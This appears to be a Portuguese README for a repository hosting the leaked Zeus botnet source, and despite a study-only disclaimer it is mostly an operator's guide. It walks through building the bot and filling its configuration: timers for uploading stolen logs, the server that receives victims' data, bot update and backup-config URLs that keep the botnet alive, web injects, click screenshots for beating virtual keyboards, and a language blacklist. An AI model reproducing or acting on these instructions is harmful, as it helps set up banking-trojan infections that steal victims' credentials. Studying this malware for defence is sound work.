# Zeus
Código-fonte da botnet Zeus. NÃO É O MEU CÓDIGO! - vazou em 2011, não sou o autor. Este repositório é apenas para fins de estudo.

# README

Esta é a versão 2.0.8.9 baixada de
http://www.mdl4.com/2011/05/download-zeus-source-code/

Este repositório não contém meu código. Eu o carreguei no GitHub para simplificar o processo de obtenção/análise do código.

Terceiro parágrafo:

Configurando o bot
Instalação passo a passo:
1) A partir do seu pacote existente, execute 'local\cp.exe', que é um gerador e arquivo de configuração do bot.
2) Abra o 'Builder'. Clique em 'Browse' e selecione o arquivo de configuração com o nome de MDM 'local\config.txt'.
3) Clique em 'Edit config', o que resultará na abertura de um editor de texto. Migre o arquivo da seguinte maneira:

Primeiro:
O arquivo de configuração original é um arquivo de texto codificado no Windows, e é necessário para criar o arquivo de configuração final (que é um arquivo binário para download do bot) e o próprio bot. No seu pacote de montagem, o arquivo de configuração de exemplo deve estar localizado na pasta 'local' e se chamar config.txt. Você pode abrir o arquivo em um editor de texto, como o 'Notepad' (Bloco de Notas).

O arquivo consiste em registros, um registro por linha. A gravação é composta de parâmetros, sendo que o primeiro parâmetro é o nome comumente escrito (mas não sempre, como em casos onde há transferência de dados, sem nome). Os parâmetros são separados por espaços, se o parâmetro contiver espaço ou tabulação, deve ser colocado entre aspas duplas ("), a mesma regra se aplica ao nome. O número de parâmetros é ilimitado, e se o registro tiver um nome, ele é lido de forma insensível a maiúsculas/minúsculas.
Exemplos:
username Kot Matroskin
nome do registro - username, opção 1 - Kot, opção 2 - Matroskin.

username "James" Bond "
nome do registro - username, opção 1 - James, opção 2 - Bond.

username "Volodia Putin"
nome do registro - username, opção 1 - Volodia Putin.

"Url" "http://example.com/" index.php
nome do registro - url, opção 1 - http://example.com/, opção 2 - index.php

Existem também nomes de entradas especiais que permitem compartilhar o arquivo de configuração em sub-seções, que podem conter qualquer número de sub-seções e registros. Elas são chamadas de seções e consistem em um nome e um parâmetro que determina o nome da seção (a diferenciação de maiúsculas/minúsculas não é levada em conta neste parâmetro). O final da seção é indicado pela entrada 'end'. Na documentação, o aninhamento de registros em relação às sub-seções será designado por ->. Ou seja, registros com o nome 'username' pertencentes à seção 'userdata' serão designados como userdata->username, etc.

Exemplos:
entry "userdata"
fname "petia"
lname "lolkin"
end

entry compdata
name "pcvasya"
entry devices - o conteúdo desta seção, um exemplo de quando o registro não tem nome, há uma lista de dispositivos.
cdrom
"Hdd"
fdd
end
end

Você também pode inserir comentários. Comentários devem estar em uma linha separada e começar com ';'. Se o primeiro parâmetro no registro também começar com ';', esse parâmetro deve estar entre aspas.

Exemplos:
; Olá. Eu acho que sou um herói!
; Como você está? - isso não é um registro
"; Eu te amo" - e aqui já é um registro.

Segundo:
Entradas do Arquivo de Configuração
O arquivo consiste em duas seções: StaticConfig e DynamicConfig.

StaticConfig, os valores prescritos nesta seção vão diretamente para o arquivo do bot, ou seja, no exe, e definem o comportamento básico do bot no computador da vítima.
Dependendo da sua compilação, alguns detalhes podem não ter valor para você. Todos os parâmetros significativos estão prescritos no exemplo que acompanha o pacote de montagem.
botnet [string] - especifica o nome de uma botnet, que pertence ao bot.
string - o nome de uma botnet com até 4 caracteres, ou 0 - para o valor padrão.

Valor recomendado: botnet 0

timer_config [número1] [número2] - determina os intervalos nos quais o arquivo de configuração deve ser atualizado.
número1 - Especifica o tempo em minutos para atualizar o arquivo de configuração, se o último carregamento foi bem-sucedido.
número2 - Especifica o tempo em minutos para atualizar o arquivo de configuração, em caso de erro no carregamento anterior.

Valor recomendado: timer_config 60 5

timer_logs [número1] [número2] - determina os intervalos nos quais os logs acumulados devem ser enviados para o servidor.
número1 - Especifica o tempo em minutos para enviar os logs, se o envio anterior foi bem-sucedido.
número2 - Especifica o tempo em minutos para enviar os logs, em caso de erro no envio anterior.

Valor recomendado: timer_logs 2 2

timer_stats [número1] [número2] - determina os intervalos nos quais as estatísticas devem ser enviadas para o servidor. (Inclui instalação, presença online, portas abertas, serviços, socks, capturas de tela, etc.)
número1 - Especifica o tempo em minutos para enviar as estatísticas, se o envio anterior foi bem-sucedido.
número2 - Especifica o tempo em minutos para enviar as estatísticas, em caso de erro no envio anterior.

Valor recomendado: timer_logs 20 10

url_config [url] - URL onde está localizado o arquivo de configuração principal. Este é o parâmetro mais importante; se a URL não estiver disponível, a infecção no computador da vítima não fará sentido.

url_compip [url] [número] - especifica o site onde você pode verificar seu IP, usado para determinar o NAT.
url - especifica a URL da web
número - Especifica a quantidade de bytes necessários para baixar do site para visualizar seu IP.

blacklist_languages [número1] [número2] ... [númeroX] - especifica uma lista de códigos de idioma do Windows, para os quais o bot sempre estará em modo seguro, ou seja, não enviará logs e estatísticas, mas acessará o arquivo de configuração.
númeroX - código de idioma, por exemplo, RU - 1049, EN - 1033.

DynamicConfig, os valores prescritos nesta seção, são para o arquivo de configuração final.
Dependendo da sua compilação, alguns detalhes podem não ter valor para você. Todos os parâmetros significativos estão prescritos no exemplo que acompanha o pacote de montagem.
url_loader [url] - especifica a URL de onde você pode baixar a atualização do bot. Esta opção é relevante apenas se você estiver executando uma nova versão do botnet e prescrito a configuração dele para a mesma URL, caso em que a versão antiga do bot começará a ser atualizada baixando o arquivo especificado neste registro.

url_server [url] - especifica a URL para onde serão enviadas as estatísticas, arquivos, logs, etc. dos computadores das vítimas.

file_webinjects - define um arquivo local, que é uma lista de web injeções. A descrição do formato deste arquivo pode ser encontrada aqui

Subseção AdvancedConfigs - enumera uma lista de URLs de onde você pode baixar um arquivo de configuração de backup, nos casos de inacessibilidade do arquivo principal. Recomenda-se preencher esta subseção com 1-3 URLs, que salvarão a botnet da morte em casos de inacessibilidade do arquivo de configuração principal, facilitando a transferência para outro servidor. Não é necessário que os arquivos existam nessas URLs inicialmente, o mais importante é poder colocar os arquivos nessas URLs. Os arquivos devem ser misturados lá apenas após a descoberta de que o arquivo de configuração principal não está disponível, mas se você quiser ter os arquivos nessas URLs, deve atualizá-los em sincronia com o arquivo de configuração principal. Os arquivos de backup não podem ser diferentes dos principais e são criados da mesma forma.

Exemplo:
entry "AdvancedConfigs"
"http://url1/cdffd.ccc"
"http://url2/cdf34.dc"
end

Subseção WebFilters - tem dois propósitos:
enumera uma lista de máscaras de URL, que devem ser registradas ou removidas do log, independentemente do tipo de solicitação (GET, POST). Se o primeiro caractere da máscara for um '!', a coincidência da URL com essa máscara, a entrada no log não será produzida (por exemplo, a máscara !* banirá a entrada de URL, exceto aquelas listadas antes dela).
A máscara de URL, no início do tratamento, criará capturas de tela do clique do botão esquerdo do mouse (útil para contornar o teclado virtual). Esta máscara de URL deve começar com o caractere '@'.
Nota: URLs listadas nesta seção, o valor é ignorado por StaticConfig.ignore_http

Exemplo:
entry "WebFilters"
, O log gravará todas as URLs correspondentes a esta máscara.
"http://www.google.com/*"
, O log gravará todas as URLs correspondentes a esta máscara.
"!http://*yahoo.com/*"
E após a abertura desta página, serão criadas capturas de tela
